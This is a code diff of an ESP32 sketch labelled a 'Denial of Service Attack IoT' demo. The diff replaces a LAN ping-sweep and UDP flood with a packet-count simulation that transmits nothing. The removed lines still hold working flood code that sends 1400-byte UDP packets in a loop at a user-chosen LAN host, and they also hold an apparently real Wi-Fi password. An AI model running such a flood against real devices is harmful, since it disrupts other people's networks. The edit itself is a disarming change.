@@ -1,219 +1,318 @@
+
 #include <WiFi.h>
-#include <WiFiUdp.h>
 #include <ESPping.h>
 #include <Wire.h>
 #include <LiquidCrystal_I2C.h>
 
+// ==========================================
+// Project: Denial of Service Attack IoT
+// Platform: ESP32
+// Purpose: Educational Network Security Demo
+// ==========================================
+
+// Wi-Fi Configuration
+// Replace these values for local testing.
+// Do not publish real Wi-Fi credentials.
+
+const char* ssid = "YOUR_WIFI_NAME";
+const char* password = "YOUR_WIFI_PASSWORD";
+
+// Hardware Configuration
+#define BUTTON_PIN 0
+#define LCD_SDA 21
+#define LCD_SCL 22
+
 LiquidCrystal_I2C lcd(0x27, 16, 2);
 
-const char* ssid     = "RAM";
-const char* password = "779443847r@00f";
+// Network Discovery
+const int MAX_DEVICES = 20;
+IPAddress devices[MAX_DEVICES];
 
-#define BUTTON_PIN 0
-
-WiFiUDP udp;
-IPAddress devices[20];
 int devicesFound = 0;
 int selectedIndex = 0;
 
-IPAddress targetIP(0, 0, 0, 0);
-const int targetPort = 80;
+IPAddress selectedIP(0, 0, 0, 0);
 
-unsigned long packetCount = 0;
-unsigned long startTime   = 0;
-unsigned long lastLCD     = 0;
-float currentRate         = 0;
+// Simulation Statistics
+unsigned long simulatedPackets = 0;
+unsigned long startTime = 0;
+unsigned long lastLCD = 0;
+unsigned long lastSerial = 0;
 
-char payload[1400];
+const unsigned long DISPLAY_INTERVAL = 500;
+const unsigned long SIMULATED_RATE = 1800;
 
 // ==========================================
-// 1. مسح الشبكة + إضافة IP الكمبيوتر يدوياً
+// 1. LCD Helper
 // ==========================================
-void scanNetwork() {
+
+void showMessage(const String& line1,
+                 const String& line2 = "") {
   lcd.clear();
   lcd.setCursor(0, 0);
-  lcd.print("Scanning LAN...");
+  lcd.print(line1);
+  lcd.setCursor(0, 1);
+  lcd.print(line2);
+}
 
-  Serial.println("\n=== Scanning LAN ===");
+// ==========================================
+// 2. Wi-Fi Connection
+// ==========================================
+
+void connectWiFi() {
+  showMessage("Connecting...", "Please wait");
+
+  WiFi.mode(WIFI_STA);
+  WiFi.begin(ssid, password);
+
+  Serial.println("Connecting to Wi-Fi...");
+
+  while (WiFi.status() != WL_CONNECTED) {
+    delay(500);
+    Serial.print(".");
+  }
+
+  Serial.println();
+  Serial.println("Wi-Fi connected!");
+
+  Serial.print("ESP32 IP: ");
+  Serial.println(WiFi.localIP());
+
+  showMessage("WiFi Connected", WiFi.localIP().toString());
+  delay(2000);
+}
+
+// ==========================================
+// 3. Network Discovery
+// ==========================================
+
+void scanNetwork() {
+  showMessage("Scanning LAN...", "Please wait");
+
+  Serial.println();
+  Serial.println("=== Network Discovery ===");
+
   devicesFound = 0;
+
   IPAddress localIP = WiFi.localIP();
 
-  // 🎯 إضافة IP الكمبيوتر يدوياً
-  IPAddress pcIP(192, 168, 0, 135);
-  devices[devicesFound] = pcIP;
-  devicesFound++;
-  Serial.printf("[%d] Added PC: %s\n", devicesFound, pcIP.toString().c_str());
+  for (int i = 1;
+       i <= 254 && devicesFound < MAX_DEVICES;
+       i++) {
 
-  for (int i = 1; i <= 254 && devicesFound < 20; i++) {
-    IPAddress testIP(localIP[0], localIP[1], localIP[2], i);
-    if (testIP == localIP) continue;
-    if (testIP == pcIP) continue;
+    IPAddress testIP(
+      localIP[0],
+      localIP[1],
+      localIP[2],
+      i
+    );
+
+    if (testIP == localIP) {
+      continue;
+    }
 
     lcd.setCursor(0, 1);
     lcd.print("Scan:");
     lcd.print(i);
-    lcd.print("/254  ");
+    lcd.print("/254    ");
 
     if (Ping.ping(testIP, 1)) {
       devices[devicesFound] = testIP;
       devicesFound++;
-      Serial.printf("[%d] Found: %s (%d ms)\n",
-                    devicesFound,
-                    testIP.toString().c_str(),
-                    (int)Ping.averageTime());
+
+      Serial.print("Found: ");
+      Serial.println(testIP.toString());
     }
   }
 
-  Serial.printf("\nTotal devices found: %d\n", devicesFound);
-  lcd.clear();
-  lcd.setCursor(0, 0);
-  lcd.print("Found: ");
-  lcd.print(devicesFound);
+  Serial.print("Total devices found: ");
+  Serial.println(devicesFound);
+
+  showMessage(
+    "Scan Complete",
+    "Found: " + String(devicesFound)
+  );
+
   delay(2000);
 }
 
 // ==========================================
-// 2. اختيار الجهاز يدوياً
+// 4. Device Selection
 // ==========================================
-void selectTargetManually() {
+
+void selectDevice() {
   if (devicesFound == 0) {
-    lcd.clear();
-    lcd.print("No devices!");
+    showMessage("No Devices", "Restarting...");
     delay(3000);
     ESP.restart();
   }
 
-  Serial.println("\n=== Select Target Manually ===");
-  Serial.println("Press BOOT to cycle through devices");
-  Serial.println("Wait 5 seconds to auto-confirm");
+  selectedIndex = 0;
 
-  unsigned long lastButtonTime = 0;
-  unsigned long lastChangeTime = millis();
-  const unsigned long AUTO_CONFIRM_MS = 5000;
+  unsigned long lastChange = millis();
+  unsigned long lastButton = 0;
+
+  const unsigned long CONFIRM_DELAY = 5000;
+
+  Serial.println();
+  Serial.println("=== Device Selection ===");
+  Serial.println("Press BOOT to change device.");
 
   while (true) {
-    lcd.clear();
-    lcd.setCursor(0, 0);
-    lcd.print("Target: ");
-    lcd.print(selectedIndex + 1);
-    lcd.print("/");
-    lcd.print(devicesFound);
+    unsigned long now = millis();
 
-    lcd.setCursor(0, 1);
-    lcd.print(devices[selectedIndex].toString());
+    if (digitalRead(BUTTON_PIN) == LOW &&
+        now - lastButton > 300) {
 
-    unsigned long elapsed = millis() - lastChangeTime;
-    unsigned long remaining = (AUTO_CONFIRM_MS - elapsed) / 1000;
+      lastButton = now;
+      lastChange = now;
 
-    if (remaining <= 3 && remaining > 0) {
-      lcd.setCursor(14, 0);
-      lcd.print(remaining);
-      lcd.print(" ");
+      selectedIndex =
+        (selectedIndex + 1) % devicesFound;
+
+      Serial.print("Selected: ");
+      Serial.println(
+        devices[selectedIndex].toString()
+      );
     }
 
-    if (elapsed >= AUTO_CONFIRM_MS) {
-      Serial.println("Auto-confirmed by timeout!");
+    if (now - lastChange >= CONFIRM_DELAY) {
       break;
     }
 
-    if (digitalRead(BUTTON_PIN) == LOW && millis() - lastButtonTime > 300) {
-      lastButtonTime = millis();
-      selectedIndex = (selectedIndex + 1) % devicesFound;
-      lastChangeTime = millis();
-      Serial.printf("Selected: %s\n", devices[selectedIndex].toString().c_str());
-    }
+    lcd.setCursor(0, 0);
+    lcd.print("Device:");
+    lcd.print(selectedIndex + 1);
+    lcd.print("/");
+    lcd.print(devicesFound);
+    lcd.print("    ");
+
+    lcd.setCursor(0, 1);
+    lcd.print(
+      devices[selectedIndex].toString()
+    );
 
     delay(100);
   }
 
-  targetIP = devices[selectedIndex];
+  selectedIP = devices[selectedIndex];
 
-  lcd.clear();
-  lcd.setCursor(0, 0);
-  lcd.print("Target:");
-  lcd.setCursor(0, 1);
-  lcd.print(targetIP.toString());
+  showMessage(
+    "Selected Device",
+    selectedIP.toString()
+  );
+
+  Serial.print("Confirmed IP: ");
+  Serial.println(selectedIP.toString());
+
   delay(2000);
 }
 
 // ==========================================
-// 3. عرض الإحصائيات
+// 5. Safe Traffic Simulation
 // ==========================================
-void updateLCD() {
-  unsigned long elapsed = (millis() - startTime) / 1000;
-  currentRate = (elapsed > 0) ? (packetCount / (float)elapsed) : 0;
 
-  lcd.clear();
-  lcd.setCursor(0, 0);
-  lcd.print("Tgt:");
-  lcd.print(targetIP[3]);
+void updateSimulation() {
+  unsigned long elapsedMs = millis() - startTime;
 
-  lcd.setCursor(0, 1);
-  lcd.print("P:");
-  if (packetCount > 999999) {
-    lcd.print(packetCount / 1000);
-    lcd.print("k");
-  } else {
-    lcd.print(packetCount);
-  }
-
-  lcd.print(" R:");
-  lcd.print((int)currentRate);
+  // Calculated simulation only.
+  // No UDP packets are transmitted.
+  simulatedPackets =
+    (elapsedMs / 1000UL) * SIMULATED_RATE +
+    ((elapsedMs % 1000UL) * SIMULATED_RATE) / 1000UL;
 }
 
 // ==========================================
-// 4. setup & loop
+// 6. LCD Statistics
 // ==========================================
+
+void updateLCD() {
+  lcd.clear();
+
+  lcd.setCursor(0, 0);
+  lcd.print("SIM Tgt:");
+  lcd.print(selectedIP[3]);
+
+  lcd.setCursor(0, 1);
+  lcd.print("P:");
+
+  if (simulatedPackets > 999999) {
+    lcd.print(simulatedPackets / 1000);
+    lcd.print("k");
+  } else {
+    lcd.print(simulatedPackets);
+  }
+
+  lcd.print(" R:");
+  lcd.print(SIMULATED_RATE);
+}
+
+// ==========================================
+// 7. Setup
+// ==========================================
+
 void setup() {
   Serial.begin(115200);
   delay(500);
 
   pinMode(BUTTON_PIN, INPUT_PULLUP);
 
-  Wire.begin(21, 22);
+  Wire.begin(LCD_SDA, LCD_SCL);
+
   lcd.init();
   lcd.backlight();
 
-  lcd.setCursor(0, 0);
-  lcd.print("Connecting...");
+  showMessage(
+    "IoT Security",
+    "ESP32 Demo"
+  );
 
-  WiFi.begin(ssid, password);
-  Serial.print("Connecting to RAM");
-  while (WiFi.status() != WL_CONNECTED) {
-    delay(500);
-    Serial.print(".");
-  }
-  Serial.println("\nConnected!");
-  Serial.printf("ESP32 IP: %s\n", WiFi.localIP().toString().c_str());
+  delay(2000);
 
+  connectWiFi();
   scanNetwork();
-  selectTargetManually();
+  selectDevice();
 
-  lcd.clear();
-  lcd.setCursor(0, 0);
-  lcd.print("Starting UDP...");
+  showMessage(
+    "Simulation",
+    "Starting..."
+  );
 
-  for (int i = 0; i < 1400; i++) payload[i] = 'A' + (i % 26);
-  udp.begin(random(1024, 65535));
+  delay(1500);
+
   startTime = millis();
+
+  Serial.println();
+  Serial.println("=== Simulation Started ===");
+  Serial.println("No packets are transmitted.");
 }
 
+// ==========================================
+// 8. Main Loop
+// ==========================================
+
 void loop() {
-  udp.beginPacket(targetIP, targetPort);
-  udp.write((uint8_t*)payload, sizeof(payload));
-  udp.endPacket();
-  packetCount++;
+  updateSimulation();
 
-  if (millis() - lastLCD >= 500) {
-    lastLCD = millis();
+  unsigned long now = millis();
+
+  if (now - lastLCD >= DISPLAY_INTERVAL) {
+    lastLCD = now;
     updateLCD();
+  }
 
-    static unsigned long lastSerial = 0;
-    if (millis() - lastSerial >= 2000) {
-      lastSerial = millis();
-      unsigned long elapsed = (millis() - startTime) / 1000;
-      Serial.printf("Target: %s | Pkts: %lu | Time: %lus | Rate: %.1f pkt/s\n",
-                    targetIP.toString().c_str(), packetCount, elapsed, currentRate);
-    }
+  if (now - lastSerial >= 2000) {
+    lastSerial = now;
+
+    unsigned long elapsed =
+      (now - startTime) / 1000;
+
+    Serial.printf(
+      "[SIMULATION] IP: %s | Packets: %lu | Time: %lus | Rate: %lu pkt/s\n",
+      selectedIP.toString().c_str(),
+      simulatedPackets,
+      elapsed,
+      SIMULATED_RATE
+    );
   }
 }
